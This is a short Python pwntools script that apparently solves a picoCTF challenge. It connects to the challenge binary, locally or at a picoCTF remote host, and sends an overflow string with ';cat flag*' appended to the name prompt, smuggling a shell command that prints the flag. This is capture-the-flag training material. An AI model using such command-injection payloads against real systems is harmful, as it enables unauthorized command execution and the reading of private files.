#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("amiable-citadel.picoctf.net", 52531)

    return r


def main():
    r = conn()

    r.sendlineafter(b"name?\n", b"AAAAAAAAAAA;cat flag*")
    flag = r.recvlines(2)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
